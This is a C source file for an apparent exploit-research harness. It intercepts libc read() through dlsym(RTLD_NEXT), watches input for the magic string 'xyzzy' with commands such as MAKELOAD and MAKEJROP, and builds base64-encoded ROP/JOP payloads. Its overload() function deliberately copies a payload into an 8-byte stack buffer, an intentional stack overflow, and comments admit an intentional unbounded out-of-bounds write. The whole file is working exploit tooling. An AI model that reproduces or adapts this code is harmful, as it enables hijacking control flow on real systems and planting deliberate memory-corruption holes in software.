#define _GNU_SOURCE
#include <assert.h>
#include <dlfcn.h>	// For dlsym()
#include <stdio.h>	// For i/o
#include <string.h>	// For str...() and mem...()

#include "base64.h"
#include "payload.h"
#include "strnstr.h"

static const char s_basemagic[]	= "xyzzy";
static const char s_makeload[]	= "MAKELOAD";
static const char s_makejrop[]	= "MAKEJROP";
static const char s_dumpload[]	= "DUMPLOAD";
static const char s_overload[]	= "OVERLOAD";
static const char s_overflow[]	= "OVERFLOW";

// In-place substitution of request with result. So wrong...
static ssize_t falseEcho(PayloadPtr plp, char *p, ssize_t np, ssize_t nc) {
        // Generate the payload that we will "echo" back
        unsigned char sPayload64[4096];
        size_t nPayload64 = b64Encode((const unsigned char *) plp, sizeof(*plp), sPayload64, sizeof(sPayload64));

        // Make room for the payload (where the request used to be).
        char *src = p + nc;
        char *dst = p + nPayload64 - strlen(s_makeload) + strlen(s_overflow);
        ssize_t delta = dst - src;
        memmove(dst, src, np - nc);

        // Replace s_makeload with s_overflow
        memcpy(p - strlen(s_makeload), s_overflow, strlen(s_overflow));
        p += strlen(s_overflow) - strlen(s_makeload);

        // Place the payload in the newly created space
        memcpy(p, sPayload64, nPayload64);

        return delta;
} // falseEcho()

// IDENTICAL to overflow(), but with two dumpload() calls for debugging.
static void overload(Pointer src, size_t n, BaseAddressesPtr bap) {
        char buffer[8] = {'E', 'A', 'S', 'T', 'E', 'R', ' ', 0 };

	assert(n == sizeof(Payload));

	bap->buf_base = &buffer;

	Pointer dst = dofixups(src, n, bap);
	dumpload(src, bap, "Before dofixups()");
	dumpload(dst, bap, "After dofixups()");

	memcpy(buffer, dst, n);
} // overload()

// Interloper read function that watches for the magic string.
typedef
ssize_t Read(int fd, void *buf, size_t count);
ssize_t read(int fd, void *buf, size_t count) {
	Read *libc_read = (Read *) dlsym(RTLD_NEXT, "read");
	ssize_t result = libc_read(fd, buf, count);

	char *p = (result < (ssize_t) strlen(s_basemagic)) ? NULL : strnstr(buf, s_basemagic, result);

	if (p) {
		p += strlen(s_basemagic);

		Payload payload;
		initload(&payload);

		BaseAddresses baseAddresses;
		initBaseAddresses(&baseAddresses);

		if (!strncmp(s_makeload, p, strlen(s_makeload))) {
			p += strlen(s_makeload);

			ssize_t nc = makeload(&payload, &baseAddresses, p, result - (p - (char *)buf));

			result += falseEcho(&payload, p, result - (p - (char *)buf), nc);

			// Unbounded out-of-bounds write that is intentional and "ok" for us now (considering everything else)
			((char *) buf)[result] = 0;
		} // if
		else if (!strncmp(s_makejrop, p, strlen(s_makejrop)))
		{
			p += strlen(s_makejrop);

			ssize_t nc = makeload(&payload, &baseAddresses, p, result - (p - (char *)buf));
			jropload(&payload, &baseAddresses);
			result += falseEcho(&payload, p, result - (p - (char *)buf), nc);

			// Unbounded out-of-bounds write that is intentional and "ok" for us now (considering everything else)
			((char *) buf)[result] = 0;
		} // else if
		else if (!strncmp(s_dumpload, p, strlen(s_dumpload))) {
			p += strlen(s_dumpload);

			unsigned char *s64 = p;
                        size_t n256 = b64Decode(s64, b64Length(s64), (unsigned char *) &payload, 65535); // ToDo: Unknown upper bounds
			assert(n256 == sizeof(Payload));

			// This is a debugging animal
			dumpload(&payload, &baseAddresses, "Detected in read() system call");
			result = 0;

			// No output needed
			((char *) buf)[result] = 0;
		} // else if
		else if (!strncmp(s_overload, p, strlen(s_overload))) {
			p += strlen(s_overload);

			unsigned char *s64 = p;
                        size_t n256 = b64Decode(s64, b64Length(s64), (unsigned char *) &payload, 65535); // ToDo: Unknown upper bounds
			assert(n256 == sizeof(Payload));

			// This is a debugging animal
                        overload(&payload, n256, &baseAddresses);
			result = 0;

			// No output needed (and shouldn't actually get here anyway)
			((char *) buf)[result] = 0;
		} // else if
	} // if

	return result;
} // read()

#ifdef FULLHOOK_MAIN
int main(int argc, char **argv)
{
	fprintf(stderr, "Running (testing) as an executable\n");

	BaseAddresses baseAddresses;
	initBaseAddresses(&baseAddresses);

	Payload payload;

	initload(&payload);
	makeload(&payload, &baseAddresses, (argc > 1) ? argv[1] : NULL, (argc > 1) ? strlen(argv[1]) : 0);
//	jropload(&payload, &baseAddresses);

	char sPayload64[1024];
        size_t nPayload64 = b64Encode((const unsigned char *) &payload, sizeof(payload), sPayload64, sizeof(sPayload64));
	fprintf(stderr, "Base64 encoded payload:\n%s%s%s\n", s_basemagic, s_overflow, sPayload64);

	overload(&payload, sizeof(payload), &baseAddresses);
} // main()
#endif
